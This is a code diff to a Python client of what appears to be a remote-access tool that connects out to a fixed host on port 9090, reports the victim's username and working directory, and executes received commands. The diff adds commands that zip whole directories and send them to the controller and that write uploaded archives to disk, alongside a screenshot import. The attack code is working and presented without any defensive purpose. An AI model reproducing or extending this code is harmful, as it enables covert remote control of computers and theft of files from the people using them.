@@ -3,10 +3,11 @@ from os import getcwd, chdir, environ, remove
 from subprocess import Popen, PIPE
 from time import sleep
 from pyautogui import screenshot
+from shutil import make_archive
 
 
 # Function used for adding header to data which tells
-# that what is length of comming data 
+# that what is length of comming data
 # format == [length of data under 10] + encrpted command
 # It means you can send 9999999999 bytes or 9.9 GB of data
 # For large data you can change size in my case it is 10
@@ -18,7 +19,7 @@ def add_header(data):
 
 
 # Function used for receiving all comming data using header
-# Please set data_part receiving bytes upto 10 bytes 
+# Please set data_part receiving bytes upto 10 bytes
 # so header can completely receive in my case it is "1024" bytes
 def recvall(s):
     new_data = True
@@ -38,15 +39,15 @@ def recvall(s):
 def connection():
     username = str(environ.get('USERNAME'))
     s = socket()
-    host = "127.0.0.1"
+    host = "192.168.0.10"
     port = 9090
     s.connect((host, port))
-	##################################################################
-	# For sending some information about device
+    ##################################################################
+    # For sending some information about device
     details = ("Connected to " + username + "'s computer\n" + getcwd())
     details = add_header(details)
     s.send(details)
-	##################################################################
+    ##################################################################
     print("Connected ...")
     while True:
         cmd = recvall(s)
@@ -55,9 +56,20 @@ def connection():
                 print("Changing Directory to " + cmd)
                 chdir(cmd[3:])
                 response = ""
-			# Please change OSError to WindowsError if you are using Windows OS
-            except OSError:
+                # Please change OSError to WindowsError if you are using Windows OS
+            except WindowsError:
                 response = "Directory Not Found"
+            response = (response + "\n" + getcwd())
+            response = add_header(response)
+            s.send(response)
+        elif cmd[:9] == "uploaddir":
+            cmd, file_data = cmd.split("||=shail=||")
+            dir_name = cmd[9:]
+            try:
+                open((dir_name + "_uploaded.zip"), 'wb').write(file_data)
+                response = "Directory has been uploaded ..."
+            except IOError:
+                response = "Directory Not Found ..."
             response = (response + "\n" + getcwd())
             response = add_header(response)
             s.send(response)
@@ -70,6 +82,17 @@ def connection():
             except IOError:
                 response = "Directory Not Found ..."
             response = (response + "\n" + getcwd())
+            response = add_header(response)
+            s.send(response)
+        elif cmd[:11] == "downloaddir":
+            dir = cmd[11:]
+            try:
+                archive = make_archive(dir, 'zip', dir)
+                response = open(archive, "rb").read()
+                remove(archive)
+            except WindowsError:
+                response = "not found"
+            response = (response + "||=shail=||" + getcwd())
             response = add_header(response)
             s.send(response)
         elif cmd[:8] == "download":
